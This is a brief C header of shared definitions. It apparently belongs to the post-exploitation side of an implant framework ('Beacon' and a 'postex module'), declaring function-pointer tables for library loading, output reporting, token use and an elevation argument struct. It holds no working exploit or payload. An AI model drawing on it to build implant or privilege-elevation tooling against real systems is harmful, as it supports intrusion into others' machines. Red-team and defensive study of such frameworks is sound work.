/*
 * Common functions and definitions between the inline-exec code in Beacon and 
 * the postex module we carve functions from.
 */

typedef struct {
	HMODULE(WINAPI *LoadLibraryA)(__in LPCSTR file);
	FARPROC(WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR proc);
	HMODULE(WINAPI *GetModuleHandleA)(LPCSTR);
	void   (WINAPI *report)(char * buffer, int length, int type);
	void   (WINAPI *reportf)(int type, char * buffer, ...);
	void   (WINAPI *errord)(int error, int arg);
	BOOL   (WINAPI *UseToken)(HANDLE token, char * buffer, DWORD blen);
	void * args;
	DWORD  alen;
	BOOL   result;
	HANDLE value;
} BEACON_FUNCS;

typedef struct {
	wchar_t             * command;
	PROCESS_INFORMATION * pi;
} ELEVATE_ARGS;